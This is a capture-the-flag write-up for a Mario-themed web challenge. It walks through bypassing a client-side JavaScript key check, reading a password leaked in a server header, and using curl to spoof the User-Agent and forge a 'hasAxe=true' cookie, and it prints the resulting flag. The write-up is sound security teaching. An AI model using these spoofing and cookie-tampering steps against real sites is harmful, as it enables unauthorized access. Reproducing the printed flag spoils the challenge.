## Executive Summary

**BrOWSER BOSS FIGHT** is a web-based cybersecurity challenge that tests a researcher's ability to identify and bypass client-side security controls, manipulate HTTP headers, and manage session states. By bypassing front-end JavaScript and tampered with cookie-based state variables, I was able to escalate my privileges from an unauthorized user to a "hero" account and capture the flag.

---

## 1. Initial Reconnaissance

Upon navigating to the target URL, I was presented with a Super Mario-themed interface featuring a "Lego Bowser's Castle" and an input field for a key.

### **Manual Source Code Review**

I inspected the HTML source code and identified a significant client-side security flaw. The application used a JavaScript `onsubmit` handler to manipulate user input before it reached the server:

JavaScript

```
document.getElementById('key-form').onsubmit = function() {
    const knockOnDoor = document.getElementById('key');
    // It replaces whatever they typed with 'WEAK_NON_KOOPA_KNOCK'
    knockOnDoor.value = "WEAK_NON_KOOPA_KNOCK"; 
    return true; 
};
```

This confirmed that any attempt made via a standard web browser would be sabotaged by the client-side script. To bypass this, I transitioned to my **Kali WSL terminal** to interact with the backend directly using `curl`.

### **HTTP Header Analysis**

I performed a verbose header inspection to identify server-side information leaks:

Bash

```
curl -i -s http://browser-boss-fight.web.ctf.umasscybersec.org:48003/
```

The `Server` header contained a critical developer note: `Server: BrOWSERS CASTLE (A note outside: "King Koopa, if you forget the key, check under_the_doormat! - Sincerely, your faithful servant, Kamek")`

This provided the password required for the next phase: **`under_the_doormat`**.

---

## 2. Vulnerability Analysis

The application suffered from three primary vulnerabilities:

1. **Insecure Client-Side Logic:** Authentication integrity was handled by a browser-side script, which is easily bypassed by intercepting or crafting raw HTTP requests.
    
2. **Identity Spoofing via User-Agent:** The server relied on the `User-Agent` string—a user-controlled header—to differentiate between "Bowser" (authorized to enter) and "Mario" (authorized to win).
    
3. **Insecure State Management (Cookie Tampering):** The application tracked the "Axe" (the victory trigger) via a plain-text cookie. Because the server did not use signed or encrypted cookies for this state, I could manually override the value.
    

---

## 3. The Exploit Path

### **Step 1: Gaining Entry (The Bowser Identity)**

Using the key found in the headers, I bypassed the front-end JavaScript and spoofed my identity as `BrOWSER` to gain access to the castle interior.

Bash

```
curl -i -c cookie.txt -X POST http://browser-boss-fight.web.ctf.umasscybersec.org:48003/password-attempt \
-H "User-Agent: BrOWSER" \
-d "key=under_the_doormat"
```

The server responded with a `302 Redirect` to `/bowsers_castle.html`, confirming successful authentication.

### **Step 2: Analyzing the "Cookie Bomb"**

When I accessed the castle interior, the server attempted to "obfuscate" the session state by sending over 150 dummy cookies. By inspecting the raw headers, I identified the "Axe" state variable hidden at the bottom of the stack:

`Set-Cookie: hasAxe=false; Path=/`

### **Step 3: Identity Escalation (The Mario Identity)**

I realized that while `BrOWSER` was required to enter the castle, only `Mario` could use the Axe to trigger the victory condition. However, the server verified that the session identity matched the User-Agent.

I generated a fresh session specifically for the "Mario" identity:

Bash

```
curl -i -c mario_cookie.txt -X POST http://browser-boss-fight.web.ctf.umasscybersec.org:48003/password-attempt \
-H "User-Agent: Mario" \
-d "key=under_the_doormat"
```

### **Step 4: Final Payload Execution**

With a valid Mario session, I executed the final exploit by manually overriding the `hasAxe` cookie to `true`. This convinced the server logic that the hero was present and had successfully wielded the weapon.

Bash

```
curl -s -b mario_cookie.txt --cookie "hasAxe=true" \
-H "User-Agent: Mario" \
http://browser-boss-fight.web.ctf.umasscybersec.org:48003/bowsers_castle.html | grep "UMASS"
```

---

## 4. Conclusion

The server processed the forged state and returned the flag within the victory text:

**Flag:** `UMASS{br0k3n_1n_2_b0wz3r5_c4st13}`

### **Key Takeaways**

- **Never trust the client:** Any security logic performed in JavaScript or stored in plain-text cookies can be manipulated by an attacker.
    
- **Sanitize Headers:** Custom server headers should never leak authentication hints or internal documentation.
    
- **Server-Side Validation:** Identity (User-Agent) and game state (Axe) should be validated on the server side using secure, signed sessions rather than relying on client-provided cookies.
